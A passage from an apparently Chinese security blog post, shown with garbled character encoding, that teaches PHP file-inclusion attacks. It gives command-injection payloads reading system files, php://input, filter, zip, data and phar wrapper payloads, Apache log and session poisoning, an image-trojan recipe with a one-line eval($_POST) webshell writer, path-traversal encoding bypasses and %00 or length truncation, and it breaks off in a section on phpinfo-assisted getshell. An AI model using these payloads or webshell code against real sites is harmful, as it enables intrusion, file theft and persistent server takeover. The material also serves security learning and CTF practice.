title="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><ul><li><p>systemï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œå¦åˆ™è¿”å›FALSE</p></li><li><p>execï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œ</p></li><li><p>shell_execï¼šæˆåŠŸæ‰§è¡Œè¿”å›å…¨éƒ¨ç»“æœï¼Œå¦åˆ™è¿”å›NULL</p></li><li><p>passthru ï¼šæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</p></li></ul><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><strong>è¯»å–æŒ‡å®šç›®å½•å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure><p><strong>è¯»å–æŒ‡å®šæ–‡ä»¶å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure><hr><h2 id="0x05phpä¼ªåè®®"><a href="#0x05phpä¼ªåè®®" class="headerlink" title="0x05phpä¼ªåè®®"></a>0x05phpä¼ªåè®®</h2><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚</strong>å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>åœ¨ctfä¸­ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p><p>é€šå¸¸ä¼šæœ‰ä¸¤ç§ç±»å‹ï¼š</p><ol><li>ä»»æ„ä»£ç æ‰§è¡Œ</li><li>æ–‡ä»¶å†…å®¹ç»•è¿‡</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(â€œshell.phpâ€,â€wâ€),â€™&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;â€™);?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>å¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">å…ˆå°†è¦æ‰§è¡Œçš„PHPä»£ç å†™å¥½æ–‡ä»¶åä¸ºphpcode.txtï¼Œå°†phpcode.txtè¿›è¡Œzipå‹ç¼©,å‹ç¼©æ–‡ä»¶åä¸ºfile.zip,å¦‚æœå¯ä»¥ä¸Šä¼ zipæ–‡ä»¶ä¾¿ç›´æ¥ä¸Šä¼ ï¼Œè‹¥ä¸èƒ½ä¾¿å°†file.zipé‡å‘½åä¸ºfile.jpgååœ¨ä¸Šä¼ ï¼Œå…¶ä»–å‡ ç§å‹ç¼©æ ¼å¼ä¹Ÿå¯ä»¥è¿™æ ·æ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">ç”±äº#åœ¨getè¯·æ±‚ä¸­ä¼šå°†åé¢çš„å‚æ•°å¿½ç•¥æ‰€ä»¥ä½¿ç”¨getè¯·æ±‚æ—¶å€™åº”è¿›è¡Œurlç¼–ç ä¸º%23ï¼Œä¸”æ­¤å¤„ç»è¿‡æµ‹è¯•ç›¸å¯¹è·¯å¾„æ˜¯ä¸å¯è¡Œï¼Œæ‰€ä»¥åªèƒ½ç”¨ç»å¯¹è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><h3 id="data-å’Œphar"><a href="#data-å’Œphar" class="headerlink" title="data://å’Œphar://"></a>data://å’Œphar://</h3><p><strong>data://</strong> åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><strong>phar://</strong> æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p><h2 id="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"><a href="#0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶" class="headerlink" title="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"></a>0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</h2><p>WEBæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨è®¿é—®æ—¥å¿—ä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®æ—¥å¿—è®°å½•çš„å†…å®¹ï¼Œç²¾å¿ƒæ„é€ è¯·æ±‚ï¼ŒæŠŠPHPä»£ç æ’å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ—¥å¿—ä¸­çš„PHPä»£ç ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»</li><li>çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€ƒApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">â€ƒâ€ƒå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ&lt;?php phpinfo(); ?&gt; å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><h2 id="0x07åŒ…å«SESSION"><a href="#0x07åŒ…å«SESSION" class="headerlink" title="0x07åŒ…å«SESSION"></a>0x07åŒ…å«SESSION</h2><p>å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>æ‰¾åˆ°SESSIONå†…çš„å¯æ§å˜é‡</li><li>SESSIONæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„</li></ol><p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p><h2 id="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶</h2><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p><h2 id="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"><a href="#0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"></a>0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶</h2><p>å¾ˆå¤šç½‘ç«™é€šå¸¸ä¼šæä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šä¸Šä¼ å¤´åƒã€æ–‡æ¡£ç­‰ï¼Œè¿™æ—¶å°±å¯ä»¥é‡‡å–ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬çš„æ–¹å¼è¿›è¡ŒåŒ…å«ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å›¾ç‰‡é©¬çš„åˆ¶ä½œæ–¹å¼å¦‚ä¸‹ï¼Œåœ¨cmdæ§åˆ¶å°ä¸‹è¾“å…¥ï¼š</span><br><span class="line"></span><br><span class="line">è¿›å…¥1.jpgå’Œ2.phpçš„æ–‡ä»¶ç›®å½•åï¼Œæ‰§è¡Œï¼š</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">å°†å›¾ç‰‡1.jpgå’ŒåŒ…å«phpä»£ç çš„2.phpæ–‡ä»¶åˆå¹¶ç”Ÿæˆå›¾ç‰‡é©¬3.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‡è®¾å·²ç»ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè·¯å¾„ä¸º&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">å›¾ç‰‡ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">ç„¶åè®¿é—®URLï¼šhttp:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpgï¼ŒåŒ…å«è¿™å¼ å›¾ç‰‡ï¼Œå°†ä¼šåœ¨index.phpæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆshell.php</span><br></pre></td></tr></table></figure><h1 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h1><h2 id="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"><a href="#0x10æŒ‡å®šå‰ç¼€ç»•è¿‡" class="headerlink" title="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"></a>0x10æŒ‡å®šå‰ç¼€ç»•è¿‡</h2><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>ä½¿ç”¨../../è¿”å›ä¸Šä¸€ç›®å½•ï¼Œç§°ä¸ºç›®å½•éå†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//å‰ç¼€</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ol><li><p>urlç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure></li><li><p>äºŒæ¬¡ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure></li><li><p>å®¹å™¨/æœåŠ¡å™¨ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x11æŒ‡å®šåç¼€ç»•è¿‡"><a href="#0x11æŒ‡å®šåç¼€ç»•è¿‡" class="headerlink" title="0x11æŒ‡å®šåç¼€ç»•è¿‡"></a>0x11æŒ‡å®šåç¼€ç»•è¿‡</h2><p>åç¼€æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//åç¼€</span></span><br><span class="line"><span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨url"><a href="#åˆ©ç”¨url" class="headerlink" title="åˆ©ç”¨url"></a>åˆ©ç”¨url</h3><p>å®Œæ•´urlæ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure><p><strong>query(?)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure><p><strong>fragment(#)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h3><p><strong>zip://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><strong>phar://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="é•¿åº¦æˆªæ–­"><a href="#é•¿åº¦æˆªæ–­" class="headerlink" title="é•¿åº¦æˆªæ–­"></a>é•¿åº¦æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ul><li>phpç‰ˆæœ¬ &lt; php 5.2.8</li></ul><p><strong>åŸç†ï¼š</strong></p><ul><li>Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒ</li><li>Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</li></ul><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><ul><li><p>åªéœ€è¦ä¸æ–­çš„é‡å¤ ./(Windowsç³»ç»Ÿä¸‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ . æˆªæ–­)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;ã€‚ã€‚ã€‚çœç•¥ã€‚ã€‚ã€‚.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>åˆ™æŒ‡å®šçš„åç¼€.txtä¼šåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰</p><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ul><li>magic_quotes_gpc = Off</li><li>phpç‰ˆæœ¬ &lt; php 5.3.4</li></ul><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><ul><li><p>ç›´æ¥åœ¨æ–‡ä»¶åçš„æœ€ååŠ ä¸Š%00æ¥æˆªæ–­æŒ‡å®šçš„åç¼€å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>æ³¨ï¼šç°åœ¨ç”¨åˆ°%00é˜¶æ®µçš„æƒ…å†µå·²ç»ä¸å¤šäº†</p><h2 id="0x12é€šè¿‡phpinfoå»Getshell"><a href="#0x12é€šè¿‡phpinfoå»Getshell" class="headerlink" title="0x12é€šè¿‡phpinfoå»Getshell"></a>0x12é€šè¿‡phpinfoå»Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p><p>phpinfoæ–‡ä»¶æ³„éœ²ä¸€ç›´è¢«å¤§å®¶æ‰€å¿½è§†ï¼Œä½†å…¶å®phpinfoå¯ä»¥ä¸ºæ”»å‡»æ¸—é€æµ‹è¯•äººå‘˜æä¾›å¾ˆå¤šçš„ä¿¡æ¯ã€‚</p><p>1.system</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p><p>æä¾›æœåŠ¡å™¨æ‰€åœ¨çš„æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ã€‚</p><p>2.çœŸå®ip</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" alt="image-20200928215935664"></p><p>çŸ¥é“çœŸå®ipçš„æˆ‘ä»¬å¯ä»¥çœå»cdnå¸¦æ¥çš„å„ç§å›°æ‰°ã€‚æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥ç«¯å£æ—ç«™ä¸€é¡¿æ“ä½œã€‚</p><p> 3.webæ ¹ç›®å½•</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p><p>ç½‘ç«™ç»å¯¹è·¯å¾„å¯¹æ¸—é€æµ‹è¯•ç›¸å½“çš„æœ‰ç”¨ï¼Œå½“ä½ 